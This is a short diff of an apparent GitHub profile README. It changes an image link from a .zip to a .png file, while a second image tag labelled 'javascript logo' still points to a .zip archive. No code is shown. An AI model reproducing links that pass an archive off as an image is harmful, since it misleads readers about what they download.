@@ -1,6 +1,6 @@
 ## <p align="center">HOLA MUNDO 👋 !!</p>
 
-![pic1](https://raw.githubusercontent.com/ronald288/ronald288/main/ungrafted/ronald288.zip)
+![pic1](https://raw.githubusercontent.com/ronald288/ronald288/main/ungrafted/ronald288.png)
 # Lenguajes
 <div align="left">
   <img src="https://raw.githubusercontent.com/ronald288/ronald288/main/ungrafted/ronald288.zip" height="40" alt="javascript logo"  />
